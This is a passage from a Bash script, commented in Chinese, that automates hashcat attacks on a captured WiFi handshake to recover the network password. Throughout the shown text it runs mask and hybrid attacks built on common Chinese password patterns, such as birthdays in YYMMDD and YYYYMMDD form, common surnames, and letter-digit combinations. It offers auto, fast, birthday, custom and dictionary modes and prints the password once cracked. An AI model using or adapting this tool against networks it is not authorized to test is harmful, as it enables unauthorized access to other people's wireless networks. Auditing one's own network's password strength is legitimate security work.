    echo -e "${PURPLE}[攻击3] 2位字母+6位生日 (YYMMDD)${NC}"
    # 90-99年
    execute_attack_with_progress "2位字母+90-99年生日" "mask" "?l?l9?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 80-89年
    execute_attack_with_progress "2位字母+80-89年生日" "mask" "?l?l8?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 00-25年
    execute_attack_with_progress "2位字母+00-25年生日" "mask" "?l?l?1?2?3?4?d?d -1 01 -2 012345 -3 01 -4 0123"
    check_cracked
}

# 攻击4: 3位字母+6位生日
attack_3letter_6digit_birthday() {
    echo -e "${PURPLE}[攻击4] 3位字母+6位生日 (YYMMDD)${NC}"
    # 90-99年
    execute_attack_with_progress "3位字母+90-99年生日" "mask" "?l?l?l9?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 80-89年  
    execute_attack_with_progress "3位字母+80-89年生日" "mask" "?l?l?l8?d?1?2?d?d -1 01 -2 0123"
    check_cracked
}

# 攻击5: 百家姓+6位生日
attack_surname_6digit_birthday() {
    echo -e "${PURPLE}[攻击5] 百家姓+6位生日 (YYMMDD)${NC}"
    create_surname_dict
    # 姓氏+6位生日 (90-99年)
    execute_attack_with_progress "百家姓+90-99年生日" "hybrid" "surname_dict.txt 9?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 姓氏+6位生日 (80-89年)
    execute_attack_with_progress "百家姓+80-89年生日" "hybrid" "surname_dict.txt 8?d?1?2?d?d -1 01 -2 0123"
    check_cracked
}

# 攻击6: 2位字母+8位生日
attack_2letter_8digit_birthday() {
    echo -e "${PURPLE}[攻击6] 2位字母+8位生日 (YYYYMMDD)${NC}"
    # 1990年代最高频
    execute_attack_with_progress "2位字母+1990-1999年生日" "mask" "?l?l199?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 1980年代
    execute_attack_with_progress "2位字母+1980-1989年生日" "mask" "?l?l198?d?1?2?d?d -1 01 -2 0123"
    check_cracked
}

# 攻击7: 3位字母+8位生日
attack_3letter_8digit_birthday() {
    echo -e "${PURPLE}[攻击7] 3位字母+8位生日 (YYYYMMDD)${NC}"
    # 1990年代
    execute_attack_with_progress "3位字母+1990-1999年生日" "mask" "?l?l?l199?d?1?2?d?d -1 01 -2 0123"
    check_cracked
}

# 攻击8: 百家姓+8位生日
attack_surname_8digit_birthday() {
    echo -e "${PURPLE}[攻击8] 百家姓+8位生日 (YYYYMMDD)${NC}"
    create_surname_dict
    # 姓氏+8位生日 (1990年代最高频)
    execute_attack_with_progress "百家姓+1990-1999年生日" "hybrid" "surname_dict.txt 199?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 姓氏+8位生日 (1980年代)
    execute_attack_with_progress "百家姓+1980-1989年生日" "hybrid" "surname_dict.txt 198?d?1?2?d?d -1 01 -2 0123"
    check_cracked
}

# 攻击9: 1位字母+7位纯数字
attack_1letter_7digit() {
    echo -e "${PURPLE}[攻击9] 1位字母+7位纯数字${NC}"
    execute_attack_with_progress "1位字母+7位数字" "mask" "?l?d?d?d?d?d?d?d"
    check_cracked
}

# 攻击10: 2位字母+6位纯数字
attack_2letter_6digit() {
    echo -e "${PURPLE}[攻击10] 2位字母+6位纯数字${NC}"
    execute_attack_with_progress "2位字母+6位数字" "mask" "?l?l?d?d?d?d?d?d"
    check_cracked
}

# 攻击11: 3位字母+5位纯数字
attack_3letter_5digit() {
    echo -e "${PURPLE}[攻击11] 3位字母+5位纯数字${NC}"
    execute_attack_with_progress "3位字母+5位数字" "mask" "?l?l?l?d?d?d?d?d"
    check_cracked
}

# 攻击12: 4位字母+4位纯数字
attack_4letter_4digit() {
    echo -e "${PURPLE}[攻击12] 4位字母+4位纯数字${NC}"
    echo -e "${YELLOW}注意: 此攻击密码空间很大，可能需要很长时间${NC}"
    read -p "确认要执行此攻击吗? [y/N]: " confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then
        execute_attack_with_progress "4位字母+4位数字" "mask" "?l?l?l?l?d?d?d?d"
        check_cracked
    fi
}

# 执行选定的攻击
execute_attacks() {
    local attacks=("$@")
    for attack in "${attacks[@]}"; do
        case $attack in
            1) attack_8digit_birthday ;;
            2) attack_8digit_numbers ;;
            3) attack_2letter_6digit_birthday ;;
            4) attack_3letter_6digit_birthday ;;
            5) attack_surname_6digit_birthday ;;
            6) attack_2letter_8digit_birthday ;;
            7) attack_3letter_8digit_birthday ;;
            8) attack_surname_8digit_birthday ;;
            9) attack_1letter_7digit ;;
            10) attack_2letter_6digit ;;
            11) attack_3letter_5digit ;;
            12) attack_4letter_4digit ;;
        esac
    done
}

# 主程序
main() {
    show_banner

    # 显示工具路径检测结果
    verify_tool_paths

    while true; do
        show_attack_menu
        
        case $choice in
            1)
                echo -e "${GREEN}执行自动模式 - 按难度从易到难依次执行...${NC}"
                echo
                # 先检查是否已经破解
                check_cracked
                execute_attacks 1 2 3 4 5 6 7 8 9 10 11 12
                ;;
            2)
                echo -e "${GREEN}执行快速模式 - 仅高效攻击...${NC}"
                echo
                # 先检查是否已经破解
                check_cracked
                execute_attacks 1 3 5 9
                ;;
            3)
                echo -e "${GREEN}执行生日模式 - 生日相关密码破解...${NC}"
                echo
                # 先检查是否已经破解
                check_cracked
                execute_attacks 1 3 4 5 6 7 8
                ;;
            4)
                show_custom_menu
                if [ -n "$custom_choices" ]; then
                    echo -e "${GREEN}执行自定义攻击...${NC}"
                    echo
                    # 先检查是否已经破解
                    check_cracked
                    execute_attacks $custom_choices
                fi
                ;;
            5)
                show_dict_menu
                execute_dict_attack $dict_choice
                check_cracked
                ;;
            0)
                echo -e "${YELLOW}退出程序...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}无效选择，请重新输入${NC}"
                sleep 1
                ;;
        esac
        
        # 最终检查
        echo -e "${CYAN}==========================================${NC}"
        if ./hashcat -m $HASH_MODE "$HANDSHAKE" --show 2>/dev/null | grep -q ":"; then
            echo -e "${GREEN}🎉 恭喜！密码破解成功！${NC}"
            echo -e "${GREEN}破解结果：${NC}"
            ./hashcat -m $HASH_MODE "$HANDSHAKE" --show
            break
        else
            echo -e "${YELLOW}本轮攻击未成功，可以选择其他模式继续${NC}"
        fi
        echo -e "${CYAN}==========================================${NC}"
        echo
        
        read -p "是否继续尝试其他攻击模式? [Y/n]: " continue_choice
        if [[ $continue_choice =~ ^[Nn]$ ]]; then
            break
        fi
    done
    
    # 清理临时文件
    rm -f chinese_wifi.txt number_dict.txt birthday_dict.txt surname_dict.txt
    
    echo -e "${CYAN}感谢使用智能破解工具！${NC}"
}

# 启动主程序
main
